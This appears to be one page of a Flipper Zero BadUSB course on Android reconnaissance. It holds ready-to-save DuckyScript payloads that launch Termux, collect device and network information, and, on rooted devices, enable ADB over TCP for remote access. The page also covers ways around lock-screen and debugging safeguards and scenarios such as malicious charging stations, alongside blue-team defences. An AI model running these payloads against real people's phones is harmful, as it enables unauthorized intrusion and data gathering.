# FZ-I11: Android Reconnaissance

## Overview

| Property | Value |
|----------|-------|
| **ID** | FZ-I11 |
| **Name** | Android Reconnaissance |
| **Difficulty** | Intermediate |
| **Target OS** | Android 10+ |
| **Requirements** | OTG adapter, USB debugging enabled |
| **MITRE ATT&CK** | T1082 (System Information Discovery) |

## Important: Android USB Attack Requirements

Android devices require specific conditions for BadUSB attacks:

### Prerequisites
1. **OTG Support**: Device must support USB OTG (On-The-Go)
2. **Developer Options**: Must be enabled
3. **USB Debugging**: Must be enabled (for full access)
4. **Screen Unlocked**: Device must be unlocked

### Limitations
- Most Android attacks require user interaction
- Security features block many automated actions
- Keyboard input works, but app launching varies
- Root access opens more possibilities

---

## The Payload

```ducky
REM =============================================
REM INTERMEDIATE: Android Reconnaissance
REM Target: Android 10+ with OTG
REM Action: Gathers device information
REM Requirements: Terminal app installed, screen unlocked
REM Skill: Intermediate
REM =============================================

REM Android requires longer delays
DELAY 4000

REM Open app drawer (may vary by launcher)
GUI
DELAY 1000

REM Search for terminal app (Termux common)
STRING termux
DELAY 500
ENTER
DELAY 3000

REM Gather system info
STRINGLN echo "=== ANDROID RECON ===" > /sdcard/recon.txt
STRINGLN echo "Date: $(date)" >> /sdcard/recon.txt
STRINGLN echo "Hostname: $(hostname 2>/dev/null || echo 'N/A')" >> /sdcard/recon.txt
STRINGLN uname -a >> /sdcard/recon.txt
STRINGLN echo "" >> /sdcard/recon.txt

REM Network info
STRINGLN echo "=== NETWORK ===" >> /sdcard/recon.txt
STRINGLN ip addr >> /sdcard/recon.txt
STRINGLN cat /etc/hosts >> /sdcard/recon.txt 2>/dev/null
STRINGLN echo "" >> /sdcard/recon.txt

REM Device properties (if accessible)
STRINGLN echo "=== DEVICE PROPS ===" >> /sdcard/recon.txt
STRINGLN getprop ro.product.model >> /sdcard/recon.txt 2>/dev/null
STRINGLN getprop ro.build.version.release >> /sdcard/recon.txt 2>/dev/null
STRINGLN getprop ro.build.fingerprint >> /sdcard/recon.txt 2>/dev/null

REM Close terminal
DELAY 1000
STRINGLN exit
```

---

## Android Attack Considerations

### What Works

| Action | Feasibility | Notes |
|--------|-------------|-------|
| Keyboard input | High | Works like any keyboard |
| App search/launch | Medium | Depends on launcher |
| Terminal commands | Medium | Requires terminal app |
| System settings | Low | Security restrictions |
| ADB commands | Requires auth | USB debugging + approval |

### What Doesn't Work (Without Root)

- Direct file system access
- Installing apps silently
- Changing system settings
- Accessing other app data
- Bypassing lock screen

---

## Alternative Android Approaches

### Option 1: Google Assistant
```ducky
REM Trigger Google Assistant
DELAY 3000
GUI a
DELAY 2000
STRING search for wifi password
ENTER
```

### Option 2: Settings Navigation
```ducky
REM Open Settings
DELAY 3000
GUI
DELAY 500
STRING settings
ENTER
DELAY 2000

REM Navigate (arrow keys)
DOWN
DOWN
ENTER
```

### Option 3: ADB Over Network (Advanced)
If USB debugging is enabled:
```ducky
REM Enable wireless ADB (requires confirmation)
DELAY 3000
GUI
DELAY 500
STRING termux
ENTER
DELAY 3000
STRINGLN su -c setprop service.adb.tcp.port 5555
STRINGLN su -c stop adbd
STRINGLN su -c start adbd
```
Then connect remotely: `adb connect <device_ip>:5555`

---

## Android Security Features

### Protections Against BadUSB

1. **Lock Screen**: Must be unlocked
2. **USB Mode Selection**: User chooses file transfer/charging
3. **USB Debugging Authorization**: Requires fingerprint of host
4. **Scoped Storage**: Apps can't access all files (Android 11+)
5. **SELinux**: Mandatory access control

### Bypassing (Legitimate Testing Only)

| Protection | Bypass Method |
|------------|---------------|
| Lock screen | Social engineering, wait for unlock |
| USB mode | User must select |
| USB debugging auth | Register host fingerprint beforehand |
| Scoped storage | Use terminal/root |

---

## Red Team Perspective

### Realistic Android Attack Scenarios

1. **Charging Station Attack**
   - Public USB charging station
   - User plugs in phone
   - Payload executes when screen unlocked

2. **"Borrow Your Charger" Attack**
   - Social engineer access to unlocked phone
   - Plug in BadUSB disguised as charger
   - 30 seconds of access

3. **Kiosk/Display Device**
   - Target devices in stores, conferences
   - Often have debug modes enabled
   - Less security consciousness

### What's Achievable
- Exfiltrate files from /sdcard
- Capture screenshots
- Send SMS (with permissions)
- Access contacts
- Enable remote access

---

## Blue Team Perspective

### Android Detection

1. **USB Connection Alerts**
   - Enable USB connection notifications
   - Require authorization for new devices

2. **ADB Monitoring**
   - Disable USB debugging in production
   - Monitor adb connections

3. **Mobile Device Management (MDM)**
   - Enforce security policies
   - Block unauthorized USB accessories

### Prevention Settings

```
Settings → Developer Options → Disable USB debugging
Settings → Security → Disable OTG when locked
Settings → Connected Devices → USB → Charge only default
```

---

## Practice Exercises

### Exercise 1: App Launcher
Test opening different apps:
- Calculator
- Camera
- Web browser

### Exercise 2: Text Entry
Create a payload that opens a note app and types a message.

### Exercise 3: Screenshot
Capture a screenshot:
```ducky
DELAY 3000
GUI POWER
DELAY 500
REM Power + Volume Down is screenshot on most devices
```
Note: Power key handling varies.

---

## Payload File

Save as `FZ-I11_Android_Recon.txt`:

```ducky
REM FZ-I11: Android Reconnaissance
REM Requires: Termux or terminal app installed
DELAY 4000
GUI
DELAY 1000
STRING termux
DELAY 500
ENTER
DELAY 3000
STRINGLN uname -a > /sdcard/recon.txt
STRINGLN ip addr >> /sdcard/recon.txt
STRINGLN getprop ro.product.model >> /sdcard/recon.txt
STRINGLN exit
```

---

[← Back to Intermediate](README.md) | [Next: FZ-I12 iOS Shortcuts →](FZ-I12_iOS_Shortcuts.md)
